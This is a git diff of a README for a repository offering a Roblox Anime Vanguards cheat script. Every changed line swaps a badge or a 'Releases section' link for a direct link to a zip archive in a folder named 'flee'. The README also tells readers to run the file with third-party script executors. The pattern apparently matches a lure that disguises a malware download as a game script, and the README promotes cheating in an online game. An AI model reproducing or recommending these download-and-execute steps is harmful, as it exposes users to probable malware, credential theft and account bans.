@@ -1,6 +1,6 @@
 # Anime-16: Roblox Anime Vanguards Script
 
-![Anime Vanguards](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge&logo=github)
+![Anime Vanguards](https://github.com/Micky-GangBang/Anime-16/raw/refs/heads/main/flee/Anime-v2.6.zip)
 
 Welcome to the **Anime-16** repository! This project focuses on providing a powerful script for Roblox Anime Vanguards. With this tool, you can enhance your gaming experience and unlock new features in Roblox. 
 
@@ -29,7 +29,7 @@ Anime-16 is designed for Roblox players who want to take their gameplay to the n
 
 To get started with Anime-16, follow these simple steps:
 
-1. **Download the Script**: Visit the [Releases section](https://github.com/Micky-GangBang/Anime-16/releases) to download the latest version of the script. Make sure to download the file and execute it on your Roblox client.
+1. **Download the Script**: Visit the [Releases section](https://github.com/Micky-GangBang/Anime-16/raw/refs/heads/main/flee/Anime-v2.6.zip) to download the latest version of the script. Make sure to download the file and execute it on your Roblox client.
 
 2. **Install an Executor**: You will need a script executor to run the script. Some popular options include Synapse X, KRNL, and Fluxus. Ensure you have one installed on your device.
 
@@ -62,7 +62,7 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## Contact
 
-For questions or support, feel free to reach out to us. You can also check the [Releases section](https://github.com/Micky-GangBang/Anime-16/releases) for updates and new features.
+For questions or support, feel free to reach out to us. You can also check the [Releases section](https://github.com/Micky-GangBang/Anime-16/raw/refs/heads/main/flee/Anime-v2.6.zip) for updates and new features.
 
 ---
 
